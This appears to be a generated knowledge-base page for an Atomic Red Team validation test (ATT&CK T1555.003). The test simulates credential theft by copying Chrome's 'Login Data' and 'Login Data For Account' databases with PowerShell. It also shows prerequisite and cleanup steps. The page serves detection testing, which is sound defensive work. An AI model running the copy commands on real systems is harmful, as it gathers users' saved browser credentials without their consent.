---
atomic_guid: "3d111226-d09a-4911-8715-fe11664f960d"
title: "Simulating access to Chrome Login Data"
framework: "atomic"
generated: "true"
attack_technique_id: "T1555.003"
attack_technique_name: "Credentials from Password Stores: Credentials from Web Browsers"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "3d111226-d09a-4911-8715-fe11664f960d"
  - "Simulating access to Chrome Login Data"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Simulating access to Chrome Login Data

Simulates an adversary accessing encrypted credentials from Google Chrome Login database.

## Metadata

- Atomic GUID: 3d111226-d09a-4911-8715-fe11664f960d
- Technique: T1555.003: Credentials from Password Stores: Credentials from Web Browsers
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1555.003/T1555.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1555-credentials_from_password_stores|T1555.003]]

## Dependencies

Chrome must be installed

### Prerequisite Check

```powershell
if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe") -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe")) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
$installer = "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi"
Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi
msiexec /i $installer /qn
Start-Process -FilePath "chrome.exe"
Stop-Process -Name "chrome"
```

## Executor

- name: powershell

### Command

```powershell
Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Destination "PathToAtomicsFolder\..\ExternalPayloads"
Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account" -Destination "PathToAtomicsFolder\..\ExternalPayloads"
```

### Cleanup

```powershell
Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Login Data" -Force -ErrorAction Ignore
Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Login Data For Account" -Force -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.yaml)
